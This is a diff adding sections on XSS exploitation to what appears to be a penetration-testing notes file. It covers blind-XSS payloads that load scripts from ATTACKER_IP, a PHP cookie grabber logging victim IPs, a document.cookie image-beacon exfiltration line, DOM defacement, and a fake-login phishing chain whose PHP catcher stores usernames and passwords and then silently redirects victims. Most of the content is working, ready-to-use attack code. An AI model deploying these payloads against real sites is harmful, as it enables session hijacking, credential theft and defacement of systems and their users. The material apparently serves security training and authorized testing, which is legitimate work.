@@ -1009,3 +1009,112 @@ detector contract that decides pass/fail; map it before grinding payload variant
   payload battery against a wedged bot.
 
 <!-- promoted-slug: xss-verification-bot-contract -->
+
+## Blind XSS: name the beacon path after the field to identify what fired
+
+When the payload renders only in a panel you cannot see (admin dashboard, support queue,
+ticket viewer), two unknowns stack: WHICH field executed and WHICH payload shape works.
+Separate them in one round by loading a remote script whose path names the field:
+
+```html
+"><script src=http://ATTACKER_IP:8081/fullname></script>
+"><script src=http://ATTACKER_IP:8081/username></script>
+```
+
+Serve the beacon with `sudo php -S 0.0.0.0:8081` from an empty dir; the requested path in
+the access log names the vulnerable field, so a single form submission tests every field at
+once. Then iterate breakout shapes against that field until one calls back (bare
+`<script src=...>` with no breakout chars, `'>` and `">` prefixes, a `javascript:eval(...)`
+bootstrap that appends a script element) and record the working form; blind XSS has the
+highest hit rate on DOM-style sinks because the output context is code you can often read.
+
+Triage before spraying: skip fields validated identically on both front and back end (an
+email format check survives a hand-crafted request) and fields never rendered in cleartext
+(passwords are hashed before storage). Each skipped field shrinks the payload battery.
+
+<!-- promoted-slug: blind-xss-field-identification -->
+
+## Cookie grabber that splits the cookie string and logs the victim IP
+
+The basic cookiegrabber.php writes one raw line; with several victims you cannot tell whose
+cookie is whose. Split on `;` and log the source IP per fragment:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $value) {
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: " . urldecode($value) . "\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+Delivery choice: an image beacon (`new Image().src='http://ATTACKER_IP/?c='+document.cookie`)
+is quieter than `document.location=...` because the page never navigates away. In a blind or
+stored context load it from a remote script (`<script src=http://ATTACKER_IP/script.js>`) so
+the payload planted in the panel stays short and you can swap the JS without re-submitting
+the form or touching the stored value again.
+
+Replay: Firefox devtools Storage tab (Shift+F9), add a cookie with the name/value split at
+the first `=` of the stolen pair, then load the authenticated page as the victim.
+
+<!-- promoted-slug: xss-cookie-grabber-victim-log -->
+
+## Defacing via stored XSS: the four DOM levers
+
+Defacing (changing the page look for every visitor) is the classic stored-XSS impact demo;
+four DOM properties cover it:
+
+```js
+document.body.style.background = "#141d2b"        // solid color
+document.body.background = "//example.com/bg.svg" // image background
+document.title = 'New Title'
+document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Message</h1></center>'
+```
+
+Write the replacement HTML separately first, minify it to a single line, then set it through
+innerHTML on the first `body` element; on pages that load jQuery, `$("#id").html(...)` hits
+multiple elements in one call. Dropping the vulnerable element itself from the injected
+markup makes the page harder to reset (the payload lives on in the back-end store).
+
+Engagement discipline: defacing is destructive to the client's face; never do it without
+explicit approval, a benign banner proof of full-page control is normally the right evidence.
+
+<!-- promoted-slug: xss-defacing-dom-elements -->
+
+## XSS phishing: clean the page so the injected login form reads as legit
+
+The fake-login payload itself (document.write of a form pointing at your host) is only half
+the attack; three cleanup steps make victims actually use it:
+
+- Remove the original input UI so only your form shows: pick the element id with the
+  inspector (Ctrl+Shift+C) then `document.getElementById('urlform').remove();`
+- Hide leftover original markup below the injection by appending an unclosed HTML comment
+  after the payload: `<!--`
+- Minify the injected HTML to one line before embedding it in the payload.
+
+Point the form at a logging endpoint, not a bare listener
+(`action=http://ATTACKER_IP:443`; the login submits as a GET, creds land in the request
+line). A catcher that logs and redirects back keeps the phish silent:
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://TARGET/original/page");
+    fclose($file); exit();
+}
+?>
+```
+
+Serve it with `sudo php -S 0.0.0.0:443` from /tmp/tmpserver. A raw `nc -lnvp 80` catches the
+same GET line but returns no valid HTTP response, so the victim sees a connection error; the
+redirect-back catcher shows them the original page, and they keep browsing. On a client
+engagement the same chain doubles as a phishing-simulation exercise on a page the staff
+already trust, which is a reportable awareness finding.
+
+<!-- promoted-slug: xss-phishing-fake-login-chain -->
